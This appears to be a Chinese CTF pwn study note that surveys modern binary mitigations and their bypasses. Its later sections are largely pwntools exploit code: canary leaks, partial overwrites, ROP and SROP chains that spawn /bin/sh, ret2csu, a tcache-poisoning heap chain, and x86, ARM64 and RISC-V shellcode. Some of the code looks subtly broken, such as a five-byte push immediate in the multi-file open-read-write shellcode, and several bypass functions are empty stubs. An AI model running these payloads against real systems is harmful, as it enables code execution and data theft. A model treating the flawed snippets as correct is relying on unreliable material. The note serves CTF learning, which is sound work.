# 现代保护机制 (Modern Protections)

## 原理

现代二进制程序启用了多种保护机制（NX/ASLR/PIE/Canary/RELRO/FORTIFY/CFI 等），增加漏洞利用难度。本文件介绍各保护机制及绕过方法。

## 保护机制总览

| 保护 | 全称 | 作用 | 绕过方法 |
|------|------|------|---------|
| NX | No-eXecute | 栈/堆不可执行 | ROP/JOP |
| ASLR | Address Space Layout Randomization | 地址随机化 | 信息泄露 |
| PIE | Position Independent Executable | 可执行文件地址随机化 | 信息泄露 |
| Canary | Stack Canary | 栈溢出检测 | 泄露 canary |
| RELRO | Relocation Read-Only | GOT 只读 | Full RELRO 难绕过 |
| FORTIFY | FORTIFY_SOURCE | 危险函数检查 | 绕过检查 |
| CFI | Control Flow Integrity | 控制流完整性 | 数据导向攻击 |
| CET | Control-flow Enforcement Technology | 硬件级 CFI | 新研究 |
| PAC | Pointer Authentication | ARM 指针认证 | 新研究 |
| MTE | Memory Tagging Extension | ARM 内存标记 | 新研究 |

## 详细说明

### 1. NX (No-eXecute)

```bash
# 检查
checksec ./pwn
# NX enabled

# 绕过：ROP/JOP
# 构造 ROP 链，使用程序/libc 中的代码片段
```

### 2. ASLR (Address Space Layout Randomization)

```bash
# 检查
cat /proc/sys/kernel/randomize_va_space
# 0: 关闭
# 1: 半随机（栈、堆、mmap）
# 2: 全随机（栈、堆、mmap、可执行文件）

# 绕过：信息泄露
# 1. 格式化字符串泄露
# 2. UAF 泄露
# 3. 越界读泄露
```

### 3. PIE (Position Independent Executable)

```bash
# 检查
checksec ./pwn
# PIE enabled

# 绕过：信息泄露
# 1. 泄露程序基址
# 2. partial overwrite（覆盖低字节）
```

### 4. Canary (Stack Canary)

```bash
# 检查
checksec ./pwn
# Canary found

# 绕过：
# 1. 泄露 canary
#    - 格式化字符串
#    - 越界读
# 2. 爆破 canary（fork 服务）
# 3. 覆盖 TLS 中的 __stack_chk_guard
```

```python
# 泄露 canary
from pwn import *

p = process('./pwn')
# 格式化字符串泄露
p.sendline(b'%7$p')  # 假设 canary 在第 7 个参数
canary = int(p.recv(), 16)
# 构造 payload
payload = b'A' * offset
payload += p64(canary)
payload += p64(0)  # saved rbp
payload += p64(ret_addr)
```

### 5. RELRO (Relocation Read-Only)

```bash
# 检查
checksec ./pwn
# No RELRO / Partial RELRO / Full RELRO

# No RELRO: GOT 可写
# Partial RELRO: GOT 部分可写
# Full RELRO: GOT 只读，无法覆盖 GOT

# 绕过 Full RELRO：
# 1. 覆盖 __malloc_hook/__free_hook（glibc < 2.34）
# 2. IO_FILE 攻击
# 3. exit_funcs 攻击
# 4. TLS 攻击
```

### 6. FORTIFY_SOURCE

```bash
# 检查
checksec ./pwn
# FORTIFY_SOURCE

# 绕过：
# 1. 使用不受 FORTIFY 保护的函数
# 2. 绕过长度检查
```

### 7. CFI (Control Flow Integrity)

```bash
# Clang CFI
# GCC CET

# 绕过：
# 1. 数据导向攻击（DOP）
# 2. 不修改控制流，修改数据
# 3. 利用合法的间接调用
```

### 8. CET (Control-flow Enforcement Technology)

```bash
# Intel CET
# 1. 间接分支跟踪（IBT）
# 2. 影子栈（Shadow Stack）

# 绕过：
# 1. 新研究
# 2. 数据导向攻击
```

### 9. PAC (Pointer Authentication)

```bash
# ARM PAC
# 指针签名

# 绕过：
# 1. 签名绕过
# 2. 新研究
```

### 10. MTE (Memory Tagging Extension)

```bash
# ARM MTE
# 内存标记

# 绕过：
# 1. 标记绕过
# 2. 新研究
```

## 绕过技巧

### 1. 信息泄露

```python
# 1. 格式化字符串
p.sendline(b'%p.%p.%p.%p.%p.%p.%p.%p')

# 2. UAF 泄露
fd = u64(read(idx, 8))

# 3. 越界读
data = read(idx, 0x100)  # 读取超过 chunk 大小

# 4. 堆溢出泄露
# 溢出到下一个 chunk，读取其内容
```

### 2. Partial Overwrite

```python
# PIE 开启时，只覆盖低字节
# 低 12 位（3 个十六进制位）固定
# 需要爆破 4 位（1 个十六进制位）

payload = b'A' * offset
payload += p64(canary)
payload += p64(0)  # saved rbp
payload += b'\x34\x12'  # 只覆盖低 2 字节，需要爆破
```

### 3. ROP 链构造

```python
from pwn import *

# 查找 gadget
rop = ROP(elf)
rop.system(next(elf.search(b'/bin/sh')))

# 或手动构造
pop_rdi = 0x401234  # pop rdi; ret
ret = 0x401235       # ret
system = 0x401236    # system

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(ret)  # 对齐
payload += p64(system)
```

### 4. SROP (Sigreturn ROP)

```python
from pwn import *

# 构造 SigreturnFrame
frame = SigreturnFrame()
frame.rax = 0xf  # execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr
frame.rip = syscall_addr

payload = b'A' * offset
payload += p64(sigreturn_addr)
payload += bytes(frame)
```

### 5. Ret2csu

```python
# 利用 __libc_csu_init 中的 gadget
# 控制多个寄存器

# 64 位
# gadget 1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
# gadget 2: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12 + rbx*8]

payload = b'A' * offset
payload += p64(gadget1)
payload += p64(0)  # rbx
payload += p64(1)  # rbp
payload += p64(func_addr)  # r12
payload += p64(arg3)  # r13 -> edi
payload += p64(arg2)  # r14 -> rsi
payload += p64(arg1)  # r15 -> rdx
payload += p64(gadget2)
```

## 2024-2026 新技术点

### 1. 硬件级防护实战绕过

```python
# Intel CET / ARM PAC+BTI / ARM MTE 的实际绕过方法

from pwn import *

context.arch = 'amd64'

# === Intel CET 实战绕过 ===
def bypass_intel_cet(p, elf, libc):
    """
    Intel CET 包含：
    1. IBT (Indirect Branch Tracking)：间接跳转必须到 ENDBR64
    2. Shadow Stack (SS)：硬件维护返回地址副本
    
    绕过 IBT：
    - 找到带 ENDBR64 的 gadget
    - 利用 __libc_csu_init 中的 gadget（有 ENDBR64）
    
    绕过 Shadow Stack：
    - 不使用 ret 控制流
    - 使用 sigreturn (SROP)
    - 使用 setjmp/longjmp
    - 利用信号处理机制
    """
    
    # 方法 1：SROP 绕过影子栈
    frame = SigreturnFrame()
    frame.rax = 59           # execve
    frame.rdi = binsh_addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_addr
    frame.rsp = stack_addr
    
    payload = b'A' * offset
    payload += p64(sigreturn_addr)  # 不通过 ret，直接调用 sigreturn
    payload += bytes(frame)
    
    # 方法 2：利用 setcontext/swapcontext
    # 这些函数从内存中恢复寄存器（包括 RIP）
    # 不经过影子栈检查
    
    return payload

# === ARM MTE 实战绕过 ===
def bypass_arm_mte(p, malloc, free, edit):
    """
    ARM MTE (Memory Tagging Extension)：
    - 4-bit tag 存储在指针高位 (bit 56-59)
    - 每 16 字节有一个 tag
    - 访问时检查 tag 是否匹配
    
    绕过方法：
    1. Tag spraying：大量分配使 tag 重复
    2. 时序攻击：精确控制 free/alloc 的时序
    3. sync vs async：async MTE 有更大的利用窗口
    """
    
    # Tag spraying 示例
    # 分配大量 chunk，等待某个 tag 重复
    # 然后通过 UAF 访问 tag 匹配的 chunk
    
    # partial pointer overwrite：
    # 只覆盖指针的低位字节，保留 tag 位
    # 例如：修改 fd 指针的 bit 0-7，不修改 bit 56-59
    
    pass

# === ARM PAC 实战绕过 ===
def bypass_arm_pac(p, elf):
    """
    ARM PAC (Pointer Authentication Code)：
    - 指针高位编码认证码
    - PACIA/PACDA：签名
    - AUTIA/AUTDA：验证
    
    绕过方法：
    1. PAC oracle：通过侧信道猜测 PAC 值
    2. 部分覆盖：保留 PAC 位
    3. 合法指针复用：从内存读取已签名指针
    4. 编程缺陷：某些场景下 PAC 可被绕过
    """
    
    # 利用已签名的函数指针
    # 从 GOT/PLT 或 vtable 中读取已签名的指针
    # 直接使用（不需要重新签名）
    
    pass
```

### 2. CFI 绕过实战

```python
# Clang CFI / GCC CET 的实际绕过方法

from pwn import *

context.arch = 'amd64'

def bypass_cfi_dop(p, elf, libc):
    """
    CFI (Control Flow Integrity) 绕过：
    - DOP (Data-Oriented Programming)：不修改控制流，只修改数据
    - 利用程序已有的间接调用
    - 通过修改数据影响程序行为
    """
    
    # DOP 示例：利用 printf 的格式化字符串
    # printf 内部有间接调用（handler lookup）
    # 通过控制格式化字符串影响 handler 选择
    
    # DOP 示例：利用 qsort 的比较函数
    # qsort 通过函数指针比较元素
    # 如果可以修改比较函数指针，可以执行任意代码
    
    # CFI 绕过实用技巧：
    # 1. __libc_csu_init 的 gadget 通常有合法的间接调用
    # 2. vtable 中的函数是合法的间接调用目标
    # 3. 利用 C++ 虚函数表（在 CFI 的白名单中）
    
    pass

def bypass_shadow_stack(p, elf):
    """
    Shadow Stack 绕过：
    - 返回地址被复制到影子栈
    - ret 时比较两个返回地址
    """
    
    # 绕过方法 1：SROP
    # 使用 sigreturn 系统调用
    # 从普通栈恢复所有寄存器（包括 RIP）
    # 不经过 ret 指令，影子栈不检查
    
    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = binsh_addr
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_addr
    
    # 绕过方法 2：setcontext
    # setcontext 从 ucontext 恢复寄存器
    # 可以控制 RIP 而不经过 ret
    
    # 绕过方法 3：longjmp
    # longjmp 恢复 jmp_buf 中的寄存器
    # 但 jmp_buf 可能也受保护
    
    pass
```

### 3. 沙箱绕过实战

```python
# seccomp 的高级绕过技术

from pwn import *

context.arch = 'amd64'

def advanced_seccomp_bypass(p, libc_base):
    """
    seccomp 高级绕过：
    - ORW (Open/Read/Write)：最常用
    - 侧信道绕过：通过 timing 或 error 信息
    - 内核漏洞绕过：利用内核漏洞逃离沙箱
    - 信号处理绕过：利用 seccomp 的信号机制
    """
    
    # === 完整 ORW Shellcode ===
    orw_shellcode = asm(f'''
        /* open("flag", O_RDONLY) */
        push 0x67616c66       /* "flag" */
        mov rdi, rsp          /* filename */
        xor esi, esi          /* O_RDONLY */
        mov al, 2             /* sys_open */
        syscall
        
        /* read(fd, buf, 0x100) */
        mov rdi, rax          /* fd */
        mov rsi, rsp          /* buf */
        xor edx, edx
        mov dl, 0x40          /* count */
        xor eax, eax          /* sys_read */
        syscall
        
        /* write(1, buf, len) */
        mov edx, eax          /* count */
        mov dil, 1            /* stdout */
        mov al, 1             /* sys_write */
        syscall
    ''')
    
    # === 多文件 ORW ===
    multi_file_orw = asm(f'''
        /* open(flag1) -> read -> write */
        push 0x3167616c66     /* "flag1" */
        mov rdi, rsp
        xor esi, esi
        mov al, 2
        syscall
        mov rdi, rax
        mov rsi, rsp
        add rsi, 0x100
        mov dl, 0x40
        xor eax, eax
        syscall
        mov edx, eax
        mov dil, 1
        mov al, 1
        syscall
    ''')
    
    # === 侧信道绕过 ===
    # 如果 seccomp 返回 SECCOMP_RET_TRACE
    # 可以通过 ptrace 与父进程通信
    
    # 如果 seccomp 允许 write 但不允许 read flag
    # 可以通过错误信息泄露
    
    return orw_shellcode
```

### 4. 新型利用链实战 (2024-2026)

```python
# 2024-2026 年 CTF 中的新型利用链实战

from pwn import *

context.arch = 'amd64'

def chain_apple2_tcache(p, elf, libc):
    """
    链 1：tcache poisoning + House of Apple 2
    适用：glibc 2.34+, Full RELRO, NX, Canary
    """
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # 信息泄露
    malloc(0x400); malloc(0x20)
    free(0); show(0)
    fd = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = fd - (libc.symbols['main_arena'] + 96)
    
    # tcache poisoning
    malloc(0x20); malloc(0x20)
    free(0); free(1)
    # ... 修改 fd，分配到 _IO_list_all
    # ... 构造 fake IO_FILE
    # ... 触发 exit
    
    p.interactive()

def chain_largebin_cat(p, elf, libc):
    """
    链 2：largebin attack + House of Cat
    适用：glibc 2.35+, seccomp
    """
    # largebin attack 修改 _IO_list_all
    # 构造 fake IO_FILE
    # ORW shellcode
    pass

def chain_unsorted_bin_orange(p, elf, libc):
    """
    链 3：unsorted bin attack + House of Orange
    适用：glibc < 2.34, 无 free 函数
    """
    # 溢出 top chunk
    # unsorted bin attack
    # 构造 fake IO_FILE
    pass
```

### 5. ARM64/RISC-V 利用实战

```python
# 非 x86 架构的实际利用

from pwn import *

# === ARM64 利用实战 ===
def arm64_exploit(p, elf, libc):
    """ARM64 平台的完整利用"""
    context.arch = 'aarch64'
    
    # ARM64 寄存器：
    # x0-x7: 参数传递 / 返回值
    # x8: 间接结果寄存器
    # x9-x15: 临时寄存器
    # x16-x17: IP0/IP1 (链接器用)
    # x18: 平台保留 (Shadow Call Stack)
    # x19-x28: callee-saved
    # x29: FP (帧指针)
    # x30: LR (返回地址)
    
    # ARM64 syscall：
    # x8 = syscall number
    # x0-x5 = arguments
    # svc #0 触发
    
    # execve shellcode
    shellcode = asm(f'''
        /* execve("/bin/sh", NULL, NULL) */
        mov x8, #221           /* __NR_execve */
        adrp x0, binsh_page
        add x0, x0, binsh_off
        mov x1, #0
        mov x2, #0
        svc #0
        binsh_page:
        .ascii "/bin/sh\\0"
    ''')
    
    return shellcode

# === RISC-V 利用实战 ===
def riscv_exploit(p, elf):
    """RISC-V 平台的完整利用"""
    context.arch = 'riscv64'
    
    # RISC-V 寄存器：
    # x0 (zero): 常量 0
    # x1 (ra): 返回地址
    # x2 (sp): 栈指针
    # x3 (gp): 全局指针
    # x4 (tp): 线程指针
    # x5-x7 (t0-t2): 临时
    # x8 (s0/fp): 帧指针
    # x9 (s1): callee-saved
    # x10-x11 (a0-a1): 参数 / 返回值
    # x12-x17 (a2-a7): 参数
    # x18-x27 (s2-s11): callee-saved
    # x28-x31 (t3-t6): 临时
    
    # ecall 触发系统调用
    # a7 = syscall number
    # a0-a5 = arguments
    
    # execve shellcode
    shellcode = asm(f'''
        /* execve("/bin/sh", NULL, NULL) */
        li a7, 221           /* __NR_execve */
        la a0, binsh
        li a1, 0
        li a2, 0
        ecall
        binsh:
        .asciz "/bin/sh"
    ''')
    
    return shellcode
```

### 6. WASM 利用入门

```python
# WebAssembly 安全研究入门

def wasm_exploitation_basics():
    """
    WASM (WebAssembly) 安全研究：
    
    1. WASM 内存模型：
       - 线性内存，字节可寻址
       - 可以从 JavaScript 访问
       - 无 ASLR（内存布局固定）
    
    2. 常见漏洞：
       - 整数溢出
       - 缓冲区溢出（通过 memory.grow）
       - 类型混淆
    
    3. 利用技术：
       - 控制函数指针表（table）
       - 覆盖内存中的数据
       - 利用 import/export 机制
    
    4. 沙箱逃逸：
       - WASM 运行在浏览器沙箱中
       - 通过 JavaScript bridge 逃逸
       - 利用浏览器漏洞
    """
    
    # WASM 二进制格式分析
    # 使用 wasm-objdump / wasm2wat
    
    # 常见攻击面：
    # 1. WASM <-> JavaScript 边界
    # 2. WASM 内存访问越界
    # 3. WASM 函数指针表
    
    pass
```

## 工具推荐

- **checksec** — 检查保护机制
- **pwntools** — Python 利用框架
- **ROPgadget** — ROP gadget 查找
- **ropper** — ROP gadget 查找
- **one_gadget** — libc one_gadget
- **seccomp-tools** — seccomp 规则查看

## 参考链接

- [ctf-wiki 保护机制](https://ctf-wiki.org/pwn/linux/mitigation/)
- [checksec](https://github.com/slimm609/checksec.sh)
- [Modern Binary Exploitation](https://github.com/RPISEC/MBE)
- [pwn college](https://pwn.college/)
